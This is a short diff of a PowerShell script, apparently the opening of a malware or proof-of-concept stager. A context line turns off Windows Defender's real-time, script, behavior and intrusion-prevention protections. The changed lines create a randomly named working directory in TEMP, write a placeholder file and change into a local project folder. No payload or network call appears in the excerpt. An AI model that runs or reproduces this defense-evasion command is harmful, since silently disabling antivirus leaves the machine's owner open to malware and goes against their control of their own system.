@@ -9,6 +9,11 @@ function random_text {
 # disable windefender
 powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'
 
-cd $env:TEMP
-$directory_name = random_text
-mkdir $directory_name
+# goto temp & make working directory
+$wd = random_text
+$path = "$env:TEMP/$wd"
+echo $path
+mkdir $path
+cd $path
+echo "" > poc. txt
+cd "C:\Users\dylan\Documents\Personal Projects\Quention\files"
